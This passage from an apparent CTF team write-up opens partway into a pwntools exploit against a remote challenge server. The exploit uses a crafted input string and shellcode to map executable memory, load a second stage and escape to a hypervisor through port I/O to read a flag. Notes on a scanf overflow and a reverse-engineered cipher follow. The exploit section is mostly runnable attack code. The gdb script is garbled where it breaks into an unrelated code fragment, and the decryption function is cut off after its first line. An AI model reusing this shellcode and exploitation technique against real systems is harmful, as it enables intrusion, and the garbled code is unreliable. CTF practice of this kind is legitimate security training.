    context(arch = 'amd64', os = 'linux')
    context.aslr = False
    def runshellcode(p, s):
        payload = '4294967295\\'
        payload += '%' * ((0x2020a0 - 0x202030) / 4 - 2)
        payload += '0:'
        payload += '1:'
        payload += '%%%%1;'
        payload += str(0x2030A4 + 0x100 - 0x7b6) + '+'
        payload += '0;'
        payload += ','
        payload = payload.ljust(0x100, '\x01')
        payload += asm('push 0x61616161')
        payload += asm(shellcraft.amd64.linux.write(1, 'rsp', 0x4))
        payload += asm(shellcraft.amd64.linux.read(0, 'rsp', 0x1000))
        payload += asm('jmp rsp')
        p.sendline(payload)
        p.recvuntil('aaaa')
        p.send(s)
        context.log_level = 'debug'
    def main():
        p = remote('35.200.23.198', 31733)
        #p = process('./user.elf')
        #p = process('./hypervisor.elf kernel.bin ld.so.2 ./user.elf'.split(' '))
        payload = ''
        mmap_addr = 0x500000
        payload += asm(shellcraft.amd64.linux.mmap(mmap_addr, 0x10000, 7, 16, -1, 0))
        payload += asm('push rax')
        payload += asm(shellcraft.amd64.linux.write(1, 'rsp', 8))
        payload += asm(shellcraft.amd64.linux.read(0, mmap_addr, 0x10000))
        payload += asm(shellcraft.amd64.linux.write(1, mmap_addr, 0x10000000000000000 - mmap_addr + 0x300000))
        payload += asm('push rax')
        payload += asm(shellcraft.amd64.linux.write(1, 'rsp', 8))
        runshellcode(p, payload)
        time.sleep(10)
        payload = 'flag2'.ljust(8, '\x00')
        payload += p64(3) + p64(0x100) + p64(0x100)
        payload += p64(1) + p64(0x100) + p64(0x100)
        payload = payload.ljust(0xa5d, '\x90') + '\x90'*36
        payload += asm('''
        mov dx, 0x8000
        mov eax, 0x0
        ''')
        payload += '\xef\xed'
        payload += asm('''
        mov dx, 0x8001
        mov eax, 0x8
        ''')
        payload += '\xef\xed'
        payload += asm('''
        mov dx, 0x8002
        mov eax, 0x20
        ''')
        payload += '\xef\xed'
        payload += '\xeb\xfe'
        payload = payload.ljust(0xadb, '\x90')
        payload += '\xeb\x80'
        p.send(payload)
        p.interactive()    
    if __name__ == '__main__':
        main()
### Super Hexagon | solved 1, stuck 2 | pzhxbz
#### 第一层
scanf里面似乎有一个溢出，可以覆盖函数指针
## Reverse
### EOP
感觉是用c++的异常处理机制实现的一个像控制流平坦化的东西。。。。
使用gdb script进行跟踪
    b *(0x8000000+0x5620)
    python f = open('log','w')
    run > n) | (d > (32-n)) ) % 0x100000000
    def en(data):   
        t1 = u32(data[0:4])   
        t2 = u32(data[4:8])   
        t3 = u32(data[8:12])   
        t4 = u32(data[12:16])
        t1 ^= 0x0C01A4D6E
        t2 ^= 0x0A4CB6636
        t3 ^= 0x5B0F5BA1
        t4 ^= 0x2B266926
        #print(hex(t1),hex(t2),hex(t3),hex(t4))
        for i in xrange(0,32,4):
            tt5 = to_bytes(t1)
            t5 = index_table1[tt5[0]] ^ index_table2[tt5[1]] ^ index_table3[tt5[2]] ^ index_table4[tt5[3]]
            tt6 = to_bytes(t2)
            t6 = index_table2[tt6[0]] ^ index_table3[tt6[1]] ^ index_table4[tt6[2]] ^ index_table1[tt6[3]]
            t3 ^=(xor_table[i] + t5 + t6)%0x100000000
            #print(hex(t1),hex(t2),hex(t3),hex(t4),hex(t5),hex(t6))
            t3 = ROR(t3,1)
            t4 = ROL(t4,1)
            #print(hex(t1),hex(t2),hex(t3),hex(t4),hex(t5),hex(t6))
            t4 ^= (xor_table[i+1] + t5 + t6 * 2)%0x100000000
            tt5 = to_bytes(t3)
            t5 = index_table1[tt5[0]] ^ index_table2[tt5[1]] ^ index_table3[tt5[2]] ^ index_table4[tt5[3]]
            tt6 = to_bytes(t4)
            t6 = index_table2[tt6[0]] ^ index_table3[tt6[1]] ^ index_table4[tt6[2]] ^ index_table1[tt6[3]]
            t1 ^= (xor_table[i+2] + t5 + t6)%0x100000000
            t1 = ROR(t1,1)
            t2 = ROL(t2,1)
            t2 ^= (xor_table[i+3] + t5 + t6 * 2)%0x100000000
            print(hex(t1),hex(t2),hex(t3),hex(t4),hex(t5),hex(t6))
        t3 ^= 0x0EF75CB8F
        t4 ^= 0x0A037222A
        t1 ^= 0x0BA69619A
        t2 ^= 0x60798932
        return p32(t3) + p32(t4) + p32(t1) + p32(t2)
解密算法如下：
    def de(data):